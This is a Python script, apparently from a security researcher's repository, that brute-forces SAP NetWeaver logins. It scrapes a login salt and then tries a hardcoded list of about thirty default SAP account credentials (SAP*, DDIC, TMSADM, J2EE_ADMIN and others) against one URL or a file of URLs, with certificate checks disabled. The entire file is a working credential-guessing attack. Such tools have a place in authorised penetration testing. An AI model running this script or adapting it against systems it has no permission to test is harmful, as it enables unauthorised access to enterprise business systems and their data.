#!/usr/bin/env python
#
# 
#
# SAP-brute.py - Bruteforce Sap netweaver login with some default creds.
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
urls = args.file


if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy

	
	

def get_salt(url):
	paramsGet = {"applicationID":"com.sap.itsam.ejb.explorer","applicationViewID":"ExplorerView","isLocal":"true"}
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:86.0) Gecko/20100101 Firefox/86.0","Connection":"close","Accept-Language":"en-US,en;q=0.5"}
	response = session.get(""+url+"/ejbexplorer", params=paramsGet, headers=headers,verify=False)
	try:
		salt = re.compile('j_salt" value="(.+?)" />').findall(response.text)[0]
		return salt
	except:
		print("[*] Failed to Grab Salt value [*]")
		print(response.text)
		exit();

def test_login(url,salt,username,password):
	paramsGet = {"applicationID":"com.sap.itsam.ejb.explorer","applicationViewID":"ExplorerView","isLocal":"true"}
	paramsPost = {"j_salt":salt,"j_username":username,"j_password":password,"save_cert":"1","uidPasswordLogon":"Log On"}
	headers = {"Origin":url,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:86.0) Gecko/20100101 Firefox/86.0","Connection":"close","Referer":""+url+"/webdynpro/resources/sap.com/tc~lm~itsam~ui~mainframe~wd/j_security_check?applicationViewID=ExplorerView&applicationID=com.sap.itsam.ejb.explorer&isLocal=true","Accept-Language":"en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}
	response = session.post(""+url+"/webdynpro/resources/sap.com/tc~lm~itsam~ui~mainframe~wd/j_security_check", data=paramsPost, params=paramsGet, headers=headers, verify=False)
	if "User authentication failed" in response.text:
		print("[*] Username: "+username+" Password: "+password+" Failed")
	else:
		print("[*] Username: "+username+" Password: "+password+" Sucessful")

           
creds = ["SMD_ADMIN:init1234","SMD_BI_RFC:init1234","SMD_RFC:init1234","SOLMAN_ADMIN:init1234","SOLMAN_BTC:init1234","SAPSUPPORT:init1234","SMD_AGT:init1234","CONTENTSERV:init1234","SAPSUPPOR:init1234","SAP*:06071992","SAP*:PASS","DDIC:19920706","TMSADM:PASSWORD","TMSADM:$1Pawd2&","SAPCPIC:ADMIN","EARLYWATCH:SUPPORT","admin:admin","J2EE_ADMIN:abcd1234","DDIC:DidNPLpw2014","SAP*:DidNPLpw2014","DEVELOPER:abCd1234","BWDEVELOPER:abCd1234","DDIC:Appl1ance","SAP*:Appl1ance","DEVELOPER:Appl1ance","BWDEVELOPER:Appl1ance","DDIC:Down1oad","SAP*:Down1oad","DEVELOPER:Down1oad","BWDEVELOPER:Down1oad"]
				


if urls:
	if os.path.exists(urls):
		with open(urls, 'r') as f:
			for line in f:
				url = line.replace("\n","")
				try:
					print("Testing "+url+"")
					for l in creds:
						li = l.split(":")
						username = li[0]
						password = li[1]
						salt = get_salt(url)
						test_login(url,salt,username,password)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
	

else:
	for l in creds:
		l = l.split(":")
		username = l[0]
		password = l[1]
		salt = get_salt(url)
		test_login(url,salt,username,password)
